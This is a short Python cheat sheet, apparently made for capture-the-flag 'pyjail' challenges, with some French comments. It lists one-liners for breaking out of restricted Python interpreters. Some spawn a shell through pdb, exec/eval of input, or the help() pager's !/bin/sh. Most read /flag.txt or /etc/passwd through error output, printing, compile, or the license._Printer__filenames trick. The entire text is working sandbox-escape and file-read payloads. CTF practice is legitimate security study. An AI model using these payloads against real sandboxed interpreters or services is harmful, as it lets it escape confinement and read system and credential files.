```py
breakpoint() # pdb -> import os; os.system("sh")
exec(input()) # import os; os.system("sh")
eval(input()) # __import__("os").system("sh")

help() # pager less -> !/bin/sh
help() # pager less -> :e/flag.txt

assert len(set( [ *open("/flag.txt"), open("/flag.txt").read(), set(open("/flag.txt")).pop() ] )) == 1

# vers stderr
exit(set(open("/flag.txt")))
exit([*open("/flag.txt")])
compile(".","/flag.txt","exec")
raise Exception(*open("/flag.txt"))


# vers stdout
help([*open("/etc/passwd")][0]) # 1, 2, 3
print(*open("/flag.txt"))
type("", (), {"__init__": lambda s: print(open("flag.txt").read())})()
memoryview(open("flag.txt", "rb").read()).tobytes()

# vers stdin
input([*open("/etc/passwd")])

# https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license
license._Printer__filenames = ['/flag.txt']; license()
[license() for _ in [license._Printer__filenames in [['/flag.txt']]]]
```
